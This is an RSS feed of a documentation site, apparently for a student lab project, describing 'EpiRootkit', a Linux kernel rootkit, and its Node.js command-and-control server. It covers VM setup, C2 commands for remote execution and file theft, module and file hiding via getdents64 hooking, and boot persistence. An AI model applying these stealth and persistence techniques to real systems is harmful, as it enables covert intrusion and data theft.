<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Tux Fan Club Docs</title><link>/</link><description>Recent content on Tux Fan Club Docs</description><generator>Hugo</generator><language>en</language><lastBuildDate>Mon, 26 May 2025 12:09:16 +0200</lastBuildDate><atom:link href="/index.xml" rel="self" type="application/rss+xml"/><item><title>Presentation</title><link>/docs/01-introduction/presentation/</link><pubDate>Wed, 07 May 2025 00:44:31 +0100</pubDate><guid>/docs/01-introduction/presentation/</guid><description>&lt;h1 id="présentation">Présentation &lt;a href="#pr%c3%a9sentation" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h1>&lt;h2 id="equipage">Equipage &lt;a href="#equipage" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;div style="display: flex; justify-content: space-between; gap: 20px; flex-wrap: wrap;">
 &lt;div style="flex: 1; min-width: 250px; text-align: center;">
 &lt;strong>Capitaine&lt;/strong>: Hugo Sibony 
 &lt;br>
 &lt;img src="/images/HS/hugo.png" alt="Hugo" style="width: 50%;">
 &lt;/div>
 &lt;div style="flex: 1; min-width: 250px; text-align: center;">
 &lt;strong>Responsable Sabordage et mutinerie&lt;/strong>: Léa Bonet 
 &lt;br>
 &lt;img src="/images/HS/lea.png" alt="Lea" style="width: 50%;">
 &lt;/div>
 &lt;/div>
 
&lt;h2 id="nom-de-léquipe">Nom de l&amp;rsquo;équipe &lt;a href="#nom-de-l%c3%a9quipe" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;p>Nous sommes Tux Fan Club 🐧&lt;/p>
&lt;p>C&amp;rsquo;est Léa qui a choisi le nom car c&amp;rsquo;est la seule personne du groupe un peu créative 👀&lt;/p>
&lt;p>(Et par ce que Hugo est gentleman et a laissé le choix a la seule femme du groupe)&lt;/p></description></item><item><title>Initial Setup &amp; Installation</title><link>/docs/02-setup/environment/</link><pubDate>Wed, 07 May 2025 00:44:31 +0100</pubDate><guid>/docs/02-setup/environment/</guid><description>&lt;h1 id="host-environment-setup-from-a-blank-system">Host Environment Setup (from a Blank System) &lt;a href="#host-environment-setup-from-a-blank-system" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h1>&lt;blockquote>
&lt;p>&lt;strong>Assumption:&lt;/strong> You are starting from a fresh Ubuntu 24.10 (amd64) install with no extra packages.&lt;/p>
&lt;/blockquote>
&lt;h2 id="1-update-system">1. Update System &lt;a href="#1-update-system" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>


 
 
 

 
 
 
 

 

 &lt;div class="prism-codeblock ">
 &lt;pre id="0e626b2" class="language-bash ">
 &lt;code>sudo apt update &amp;amp;&amp;amp; sudo apt upgrade -y&lt;/code>
 &lt;/pre>
 &lt;/div>
&lt;h2 id="2-install-essential-packages">2. Install Essential Packages &lt;a href="#2-install-essential-packages" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;p>Install all required tools for virtualization, development, and Node.js:&lt;/p>



 
 
 

 
 
 
 

 

 &lt;div class="prism-codeblock ">
 &lt;pre id="b8ce25f" class="language-bash ">
 &lt;code>sudo apt install -y qemu-kvm libvirt-daemon-system libvirt-clients bridge-utils build-essential linux-headers-$(uname -r) curl git nodejs npm&lt;/code>
 &lt;/pre>
 &lt;/div>
&lt;blockquote>
&lt;p>&lt;strong>Tip:&lt;/strong> If you get an error about missing kernel headers, ensure your kernel version matches the installed headers. Use &lt;code>uname -r&lt;/code> and &lt;code>apt search linux-headers&lt;/code> to check.&lt;/p></description></item><item><title>VM Installation &amp; Verification</title><link>/docs/02-setup/vm-installation/</link><pubDate>Wed, 07 May 2025 00:44:31 +0100</pubDate><guid>/docs/02-setup/vm-installation/</guid><description>&lt;h1 id="virtual-machine-installation--verification">Virtual Machine Installation &amp;amp; Verification &lt;a href="#virtual-machine-installation--verification" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h1>&lt;blockquote>
&lt;p>&lt;strong>You must have completed &lt;a data-bs-delay="{&amp;#34;hide&amp;#34;:300,&amp;#34;show&amp;#34;:550}" data-bs-html="true" data-bs-title="&lt;a href='/docs/02-setup/environment/'>&lt;p>SETUP&lt;/p>&lt;strong>Initial Setup &amp; Installation&lt;/strong>&lt;br>Prepare your host system from scratch for the EpiRootkit project.&lt;/a>" data-bs-toggle="tooltip" href="/docs/02-setup/environment/">Initial Setup &amp;amp; Installation&lt;/a> before proceeding.&lt;/strong>&lt;/p>
&lt;/blockquote>
&lt;h2 id="1-choose-your-vm-setup-method">1. Choose Your VM Setup Method &lt;a href="#1-choose-your-vm-setup-method" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>
&lt;nav>
	&lt;div class="nav nav-tabs" id="nav-tab" role="tablist">

		
		
		
		

		

		&lt;a class="nav-link active"
		 id="feadbcTab" data-bs-toggle="tab" data-bs-target="#feadbc"
		 type="button" role="tab" aria-controls="feadbc" aria-selected="true">Recommended: Pre-built Disks&lt;/a>

		

		&lt;a class="nav-link "
		 id="dcfebaTab" data-bs-toggle="tab" data-bs-target="#dcfeba"
		 type="button" role="tab" aria-controls="dcfeba" aria-selected="true">Build Disks Yourself&lt;/a>

		

	&lt;/div>
&lt;/nav>

&lt;div class="tab-content" id="nav-tab-content">

	







&lt;div class="tab-pane fade show active" id="feadbc" role="tabpanel" aria-labelledby="nav-1">

	&lt;h3 id="download-pre-built-images">Download Pre-built Images &lt;a href="#download-pre-built-images" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>&lt;p>Download both QCOW2 images and place them in the &lt;code>vm/&lt;/code> directory at the project root:&lt;/p></description></item><item><title>Attacking VM Setup</title><link>/docs/02-setup/attacking-vm-setup/</link><pubDate>Wed, 07 May 2025 00:44:31 +0100</pubDate><guid>/docs/02-setup/attacking-vm-setup/</guid><description>&lt;p>Follow these steps once the host environment is ready and the VMs have been created or downloaded.&lt;/p>
&lt;h2 id="usage">Usage &lt;a href="#usage" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;ol>
&lt;li>Ensure the &lt;code>attacker.qcow2&lt;/code> disk is in the &lt;code>vm/&lt;/code> directory (verify via &lt;code>./scripts/check_vms.sh&lt;/code> or see &lt;a href="/docs/02-setup/vm-installation/">VM Installation &amp;amp; Verification&lt;/a>).&lt;/li>
&lt;li>Launch the attacking VM with:



 
 
 

 
 
 
 

 

 &lt;div class="prism-codeblock ">
 &lt;pre id="b9b360f" class="language-bash ">
 &lt;code>sudo ./scripts/run_vms.sh attacker&lt;/code>
 &lt;/pre>
 &lt;/div>
Or both VMs with:



 
 
 

 
 
 
 

 

 &lt;div class="prism-codeblock ">
 &lt;pre id="fc8077c" class="language-bash ">
 &lt;code>sudo ./scripts/run_vms.sh&lt;/code>
 &lt;/pre>
 &lt;/div>
&lt;/li>
&lt;li>On the attacking VM:
&lt;ul>
&lt;li>Auto-login is enabled for user &lt;code>attacker&lt;/code> (no password prompt).&lt;/li>
&lt;li>The static IP is &lt;strong>192.168.200.11&lt;/strong>.&lt;/li>
&lt;li>The password is &lt;code>jules&lt;/code>.&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ol>
&lt;p>For more details on the network configuration and helper scripts, see &lt;a href="/docs/02-setup/environment/#how-it-works">Initial Setup &amp;amp; Installation&lt;/a>.&lt;/p></description></item><item><title>Victim VM Setup</title><link>/docs/02-setup/victim-vm-setup/</link><pubDate>Wed, 07 May 2025 00:44:31 +0100</pubDate><guid>/docs/02-setup/victim-vm-setup/</guid><description>&lt;p>Follow these steps once the host environment is ready and the VMs have been created or downloaded.&lt;/p>
&lt;ol>
&lt;li>
&lt;p>Place the &lt;code>victim.qcow2&lt;/code> disk in the &lt;code>vm/&lt;/code> directory at the project root (verify via &lt;code>./scripts/check_vms.sh&lt;/code> or see &lt;a href="/docs/02-setup/vm-installation/">VM Installation &amp;amp; Verification&lt;/a>).&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Launch the victim VM with:&lt;/p>



 
 
 

 
 
 
 

 

 &lt;div class="prism-codeblock ">
 &lt;pre id="39be92f" class="language-bash ">
 &lt;code>sudo ./scripts/run_vms.sh victim&lt;/code>
 &lt;/pre>
 &lt;/div>
&lt;p>Or both VMs with:&lt;/p>



 
 
 

 
 
 
 

 

 &lt;div class="prism-codeblock ">
 &lt;pre id="fc8077c" class="language-bash ">
 &lt;code>sudo ./scripts/run_vms.sh&lt;/code>
 &lt;/pre>
 &lt;/div>
&lt;/li>
&lt;li>
&lt;p>On the victim VM:&lt;/p>
&lt;ul>
&lt;li>The VM has auto-login enabled for the &lt;code>victim&lt;/code> user (no password prompt).&lt;/li>
&lt;li>Its static IP is &lt;strong>192.168.200.10&lt;/strong>.&lt;/li>
&lt;li>The password is &lt;code>jules&lt;/code>.&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>When finished, close the QEMU window or use &lt;strong>Ctrl+C&lt;/strong> on the host script to shut down both VMs.&lt;/p></description></item><item><title>Overview</title><link>/docs/03-attacking-program/overview/</link><pubDate>Sun, 25 May 2025 00:00:00 +0100</pubDate><guid>/docs/03-attacking-program/overview/</guid><description>&lt;h1 id="attacking-program-overview">Attacking Program Overview &lt;a href="#attacking-program-overview" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h1>&lt;p>Professional C2 (Command &amp;amp; Control) server built with Node.js providing CLI interface for managing EpiRootkit connections.&lt;/p>
&lt;h2 id="quick-start">Quick Start &lt;a href="#quick-start" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>


 
 
 

 
 
 
 

 

 &lt;div class="prism-codeblock ">
 &lt;pre id="0658a40" class="language-bash ">
 &lt;code># Install dependencies and start
cd attacking_program
pnpm install
pnpm start

# Server output
# ✓ Server started on port 4444
# ✓ Web interface started on port 3000&lt;/code>
 &lt;/pre>
 &lt;/div>
&lt;h2 id="architecture">Architecture &lt;a href="#architecture" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;h3 id="core-components">Core Components &lt;a href="#core-components" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>&lt;ul>
&lt;li>&lt;strong>CLI Interface&lt;/strong>: Vorpal.js-based interactive command system&lt;/li>
&lt;li>&lt;strong>C2 Server&lt;/strong>: TCP server handling rootkit connections on port 4444&lt;/li>
&lt;li>&lt;strong>Web Interface&lt;/strong>: Express.js REST API with Socket.IO on port 3000&lt;/li>
&lt;li>&lt;strong>Client Manager&lt;/strong>: Connection lifecycle and authentication management&lt;/li>
&lt;li>&lt;strong>Event System&lt;/strong>: Real-time event handling and logging&lt;/li>
&lt;/ul>
&lt;h3 id="technology-stack">Technology Stack &lt;a href="#technology-stack" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>&lt;ul>
&lt;li>&lt;strong>Runtime&lt;/strong>: Node.js 18+ with pnpm package manager&lt;/li>
&lt;li>&lt;strong>CLI Framework&lt;/strong>: Vorpal.js for interactive commands&lt;/li>
&lt;li>&lt;strong>Web Server&lt;/strong>: Express.js with Socket.IO for real-time updates&lt;/li>
&lt;li>&lt;strong>Encryption&lt;/strong>: XOR cipher implementation (configurable)&lt;/li>
&lt;/ul>
&lt;h2 id="core-features">Core Features &lt;a href="#core-features" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;h3 id="client-management">Client Management &lt;a href="#client-management" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>


 
 
 

 
 
 
 

 

 &lt;div class="prism-codeblock ">
 &lt;pre id="168f110" class="language-bash ">
 &lt;code>ls # List connected clients
auth &amp;lt;client&amp;gt; &amp;lt;password&amp;gt; # Authenticate with SHA-512 verification
status &amp;lt;client&amp;gt; # Get comprehensive rootkit status
keepalive &amp;lt;client&amp;gt; # Check connection health&lt;/code>
 &lt;/pre>
 &lt;/div>
&lt;h3 id="remote-operations">Remote Operations &lt;a href="#remote-operations" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>


 
 
 

 
 
 
 

 

 &lt;div class="prism-codeblock ">
 &lt;pre id="0779576" class="language-bash ">
 &lt;code>exec &amp;lt;client&amp;gt; &amp;lt;command&amp;gt; # Execute shell commands
upload &amp;lt;client&amp;gt; &amp;lt;local&amp;gt; [remote] # Upload files to victim
download &amp;lt;client&amp;gt; &amp;lt;remote&amp;gt; [local] # Download files from victim&lt;/code>
 &lt;/pre>
 &lt;/div>
&lt;h3 id="configuration-management">Configuration Management &lt;a href="#configuration-management" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>


 
 
 

 
 
 
 

 

 &lt;div class="prism-codeblock ">
 &lt;pre id="e0f06c2" class="language-bash ">
 &lt;code>config &amp;lt;client&amp;gt; # Interactive configuration menu
persist &amp;lt;client&amp;gt; [action] # Manage persistence mechanisms&lt;/code>
 &lt;/pre>
 &lt;/div>
&lt;h2 id="authentication-system">Authentication System &lt;a href="#authentication-system" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;p>&lt;strong>SHA-512 Password Authentication:&lt;/strong>&lt;/p></description></item><item><title>Command Reference</title><link>/docs/03-attacking-program/commands/</link><pubDate>Sun, 25 May 2025 00:00:00 +0100</pubDate><guid>/docs/03-attacking-program/commands/</guid><description>&lt;h1 id="command-reference">Command Reference &lt;a href="#command-reference" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h1>&lt;p>Complete reference for all C2 server commands with real examples.&lt;/p>
&lt;h2 id="core-commands">Core Commands &lt;a href="#core-commands" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;table>
 &lt;thead>
 &lt;tr>
 &lt;th>Command&lt;/th>
 &lt;th>Description&lt;/th>
 &lt;th>Authentication Required&lt;/th>
 &lt;/tr>
 &lt;/thead>
 &lt;tbody>
 &lt;tr>
 &lt;td>&lt;code>clients, ls&lt;/code>&lt;/td>
 &lt;td>List connected rootkit clients&lt;/td>
 &lt;td>No&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>&lt;code>auth &amp;lt;client&amp;gt; &amp;lt;password&amp;gt;&lt;/code>&lt;/td>
 &lt;td>Authenticate with a rootkit client&lt;/td>
 &lt;td>No&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>&lt;code>exec &amp;lt;client&amp;gt; &amp;lt;command...&amp;gt;&lt;/code>&lt;/td>
 &lt;td>Execute shell commands on target system&lt;/td>
 &lt;td>Yes&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>&lt;code>upload &amp;lt;client&amp;gt; &amp;lt;localFile&amp;gt; [remoteFile]&lt;/code>&lt;/td>
 &lt;td>Upload files from attacking machine to victim system&lt;/td>
 &lt;td>Yes&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>&lt;code>download &amp;lt;client&amp;gt; &amp;lt;remoteFile&amp;gt; [localFile]&lt;/code>&lt;/td>
 &lt;td>Download files from victim system to attacking machine&lt;/td>
 &lt;td>Yes&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>&lt;code>status &amp;lt;client&amp;gt;&lt;/code>&lt;/td>
 &lt;td>Get comprehensive rootkit status&lt;/td>
 &lt;td>Yes&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>&lt;code>keepalive &amp;lt;client&amp;gt;&lt;/code>&lt;/td>
 &lt;td>Get detailed keepalive status&lt;/td>
 &lt;td>Yes&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>&lt;code>persist &amp;lt;client&amp;gt; [action]&lt;/code>&lt;/td>
 &lt;td>Manage persistence mechanisms&lt;/td>
 &lt;td>Yes&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>&lt;code>config &amp;lt;client&amp;gt;&lt;/code>&lt;/td>
 &lt;td>Interactive configuration interface&lt;/td>
 &lt;td>Yes&lt;/td>
 &lt;/tr>
 &lt;/tbody>
&lt;/table>
&lt;h2 id="client-management">Client Management &lt;a href="#client-management" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;h3 id="ls--clients">&lt;code>ls&lt;/code> / &lt;code>clients&lt;/code> &lt;a href="#ls--clients" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>&lt;p>List connected rootkit clients with authentication status and last seen time.&lt;/p></description></item><item><title>Installation</title><link>/docs/03-attacking-program/installation/</link><pubDate>Sun, 25 May 2025 00:00:00 +0100</pubDate><guid>/docs/03-attacking-program/installation/</guid><description>&lt;h1 id="installation-guide">Installation Guide &lt;a href="#installation-guide" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h1>&lt;p>Complete setup instructions for the EpiRootkit C2 server.&lt;/p>
&lt;h2 id="prerequisites">Prerequisites &lt;a href="#prerequisites" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;h3 id="verify-prerequisites">Verify Prerequisites &lt;a href="#verify-prerequisites" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>


 
 
 

 
 
 
 

 

 &lt;div class="prism-codeblock ">
 &lt;pre id="db59196" class="language-bash ">
 &lt;code># Check Node.js version
node --version

# Check pnpm installation
pnpm --version

# Install pnpm if not available
npm install -g pnpm&lt;/code>
 &lt;/pre>
 &lt;/div>
&lt;h2 id="installation-steps">Installation Steps &lt;a href="#installation-steps" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;h3 id="1-navigate-to-project-directory">1. Navigate to Project Directory &lt;a href="#1-navigate-to-project-directory" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>


 
 
 

 
 
 
 

 

 &lt;div class="prism-codeblock ">
 &lt;pre id="1998761" class="language-bash ">
 &lt;code>cd attacking_program&lt;/code>
 &lt;/pre>
 &lt;/div>
&lt;h3 id="2-install-dependencies">2. Install Dependencies &lt;a href="#2-install-dependencies" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>


 
 
 

 
 
 
 

 

 &lt;div class="prism-codeblock ">
 &lt;pre id="d8f3194" class="language-bash ">
 &lt;code># Using pnpm (recommended)
pnpm install

# Or using npm
npm install&lt;/code>
 &lt;/pre>
 &lt;/div>
&lt;h2 id="configuration">Configuration &lt;a href="#configuration" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;h3 id="1-review-configuration-file">1. Review Configuration File &lt;a href="#1-review-configuration-file" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>


 
 
 

 
 
 
 

 

 &lt;div class="prism-codeblock ">
 &lt;pre id="3845e8d" class="language-bash ">
 &lt;code>cat config.env&lt;/code>
 &lt;/pre>
 &lt;/div>
&lt;p>&lt;strong>Default Configuration:&lt;/strong>&lt;/p></description></item><item><title>Usage Guide</title><link>/docs/03-attacking-program/usage/</link><pubDate>Sun, 25 May 2025 00:00:00 +0100</pubDate><guid>/docs/03-attacking-program/usage/</guid><description>&lt;h1 id="usage-guide">Usage Guide &lt;a href="#usage-guide" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h1>&lt;p>Complete workflows and usage scenarios for the EpiRootkit C2 server.&lt;/p>
&lt;h2 id="getting-started">Getting Started &lt;a href="#getting-started" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;h3 id="1-start-the-c2-server">1. Start the C2 Server &lt;a href="#1-start-the-c2-server" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>


 
 
 

 
 
 
 

 

 &lt;div class="prism-codeblock ">
 &lt;pre id="12b556f" class="language-bash ">
 &lt;code>cd attacking_program
pnpm start&lt;/code>
 &lt;/pre>
 &lt;/div>
&lt;h3 id="2-wait-for-rootkit-connection">2. Wait for Rootkit Connection &lt;a href="#2-wait-for-rootkit-connection" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>


 
 
 

 
 
 
 

 

 &lt;div class="prism-codeblock ">
 &lt;pre id="5912d77" class="language-bash ">
 &lt;code># On victim machine
sudo insmod epirootkit.ko

# C2 server will show:
┌─ Client-1
 ✓ [2025-05-25 16:13:29] Connected
└─&lt;/code>
 &lt;/pre>
 &lt;/div>
&lt;h3 id="3-authenticate">3. Authenticate &lt;a href="#3-authenticate" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>


 
 
 

 
 
 
 

 

 &lt;div class="prism-codeblock ">
 &lt;pre id="9e3bffe" class="language-bash ">
 &lt;code>c2-server$ auth Client-1 &amp;lt;password&amp;gt; (default: password)
┌─ Client-1
 ✓ [2025-05-25 16:13:30] Authenticated
└─&lt;/code>
 &lt;/pre>
 &lt;/div>
&lt;h4 id="brute-force-protection">Brute Force Protection &lt;a href="#brute-force-protection" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h4>&lt;p>Rate limit to 5 attempts per 60 seconds.&lt;/p></description></item><item><title>EpiRootkit Overview</title><link>/docs/04-epirootkit/overview/</link><pubDate>Sun, 25 May 2025 16:00:00 +0100</pubDate><guid>/docs/04-epirootkit/overview/</guid><description>&lt;h1 id="epirootkit">EpiRootkit &lt;a href="#epirootkit" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h1>&lt;p>Linux kernel rootkit implementation for Ubuntu 20.04 LTS (kernel 5.4.0).&lt;/p>
&lt;h2 id="what-we-built">What We Built &lt;a href="#what-we-built" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;p>EpiRootkit is a kernel module that provides:&lt;/p>
&lt;ul>
&lt;li>&lt;strong>C2 Communication&lt;/strong>: TCP connection to command &amp;amp; control server&lt;/li>
&lt;li>&lt;strong>Remote Commands&lt;/strong>: Execute shell commands with output capture&lt;/li>
&lt;li>&lt;strong>File Transfer&lt;/strong>: Upload/download files between C2 and victim&lt;/li>
&lt;li>&lt;strong>Authentication&lt;/strong>: SHA-512 password verification with rate limiting&lt;/li>
&lt;li>&lt;strong>Stealth&lt;/strong>: Hide module from &lt;code>lsmod&lt;/code> and hide files from directory listings&lt;/li>
&lt;li>&lt;strong>Persistence&lt;/strong>: Multiple mechanisms to survive reboots&lt;/li>
&lt;/ul>
&lt;h2 id="architecture">Architecture &lt;a href="#architecture" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>


 
 
 

 
 
 
 

 

 &lt;div class="prism-codeblock ">
 &lt;pre id="5ca7107" class="language- ">
 &lt;code>C2 Server (Node.js) ←→ EpiRootkit (Kernel Module) ←→ Target System
Port 4444 Network &amp;#43; Commands Linux Kernel 5.4.0&lt;/code>
 &lt;/pre>
 &lt;/div>
&lt;h2 id="quick-demo">Quick Demo &lt;a href="#quick-demo" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>


 
 
 

 
 
 
 

 

 &lt;div class="prism-codeblock ">
 &lt;pre id="4c298e8" class="language-bash ">
 &lt;code># 1. Build and load rootkit
cd rootkit &amp;amp;&amp;amp; make &amp;amp;&amp;amp; sudo insmod epirootkit.ko

# 2. Start C2 server 
cd attacking_program &amp;amp;&amp;amp; pnpm start

# 3. Use the rootkit
c2-server$ auth Client-1 password
c2-server$ exec Client-1 whoami
c2-server$ status Client-1&lt;/code>
 &lt;/pre>
 &lt;/div>
&lt;h2 id="core-components">Core Components &lt;a href="#core-components" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;h3 id="network-layer">Network Layer &lt;a href="#network-layer" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>&lt;ul>
&lt;li>&lt;strong>Connection Management&lt;/strong>: Persistent TCP connection with auto-reconnect&lt;/li>
&lt;li>&lt;strong>Keepalive System&lt;/strong>: 60-second ping/pong to detect disconnections&lt;/li>
&lt;li>&lt;strong>Socket Handling&lt;/strong>: Low-level network operations&lt;/li>
&lt;/ul>
&lt;h3 id="command-system">Command System &lt;a href="#command-system" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>&lt;ul>
&lt;li>&lt;strong>Authentication&lt;/strong>: &lt;code>auth&lt;/code> - SHA-512 password verification&lt;/li>
&lt;li>&lt;strong>Execution&lt;/strong>: &lt;code>exec&lt;/code> - Run shell commands with output capture&lt;/li>
&lt;li>&lt;strong>File Operations&lt;/strong>: &lt;code>upload&lt;/code>/&lt;code>download&lt;/code> - Transfer files&lt;/li>
&lt;li>&lt;strong>Status&lt;/strong>: &lt;code>status&lt;/code> - Get rootkit information&lt;/li>
&lt;li>&lt;strong>Persistence&lt;/strong>: &lt;code>persist_*&lt;/code> - Install/remove boot persistence&lt;/li>
&lt;li>&lt;strong>Stealth&lt;/strong>: &lt;code>hide_module&lt;/code>/&lt;code>unhide_module&lt;/code> - Toggle visibility&lt;/li>
&lt;/ul>
&lt;h3 id="stealth-features">Stealth Features &lt;a href="#stealth-features" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>&lt;ul>
&lt;li>&lt;strong>Module Hiding&lt;/strong>: Remove from kernel module list (&lt;code>lsmod&lt;/code>)&lt;/li>
&lt;li>&lt;strong>File Hiding&lt;/strong>: Hide files with specific prefixes from directory listings&lt;/li>
&lt;li>&lt;strong>Syscall Hooking&lt;/strong>: Uses kretprobe on &lt;code>getdents64&lt;/code>&lt;/li>
&lt;/ul>
&lt;h3 id="persistence-mechanisms">Persistence Mechanisms &lt;a href="#persistence-mechanisms" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>&lt;ul>
&lt;li>&lt;strong>modules-load.d&lt;/strong>: Systemd automatic module loading&lt;/li>
&lt;li>&lt;strong>Cron Jobs&lt;/strong>: Scheduled module loading&lt;/li>
&lt;li>&lt;strong>Shell Profiles&lt;/strong>: Load via user login scripts&lt;/li>
&lt;/ul>
&lt;h2 id="technical-details">Technical Details &lt;a href="#technical-details" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;ul>
&lt;li>&lt;strong>Target&lt;/strong>: Ubuntu 20.04 LTS with kernel 5.4.0&lt;/li>
&lt;li>&lt;strong>Language&lt;/strong>: C (kernel module) + Node.js (C2 server)&lt;/li>
&lt;li>&lt;strong>APIs Used&lt;/strong>: ftrace, kretprobe, VFS, crypto API&lt;/li>
&lt;li>&lt;strong>Network&lt;/strong>: TCP on port 4444 (configurable)&lt;/li>
&lt;li>&lt;strong>Authentication&lt;/strong>: SHA-512 with rate limiting (5 attempts/60s)&lt;/li>
&lt;/ul>
&lt;h2 id="configuration">Configuration &lt;a href="#configuration" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;p>Key settings in &lt;code>rootkit/core/config.h&lt;/code>:&lt;/p></description></item><item><title>Configuration Justifications</title><link>/docs/04-epirootkit/configuration-justifications/</link><pubDate>Wed, 07 May 2025 00:44:31 +0100</pubDate><guid>/docs/04-epirootkit/configuration-justifications/</guid><description>&lt;div class="alert alert-info d-flex" role="alert">
 &lt;div class="flex-shrink-1 alert-icon">
 
 &lt;span class="material-icons size-20 me-2">
 info
 &lt;/span>&lt;/div>
 
 &lt;div class="w-100">This page explains why we chose Ubuntu 20.04 LTS with the 5.4.x kernel for our rootkit development and testing.&lt;/div>
 &lt;/div>
&lt;h2 id="environment">Environment &lt;a href="#environment" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;ul>
&lt;li>&lt;strong>OS&lt;/strong>: Ubuntu 20.04 LTS (Focal Fossa)&lt;/li>
&lt;li>&lt;strong>Kernel&lt;/strong>: 5.4.x (LTS)&lt;/li>
&lt;/ul>
&lt;hr>
&lt;h2 id="why-ubuntu-2004-lts">Why Ubuntu 20.04 LTS? &lt;a href="#why-ubuntu-2004-lts" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>
&lt;div class="alert alert-success d-flex" role="alert">
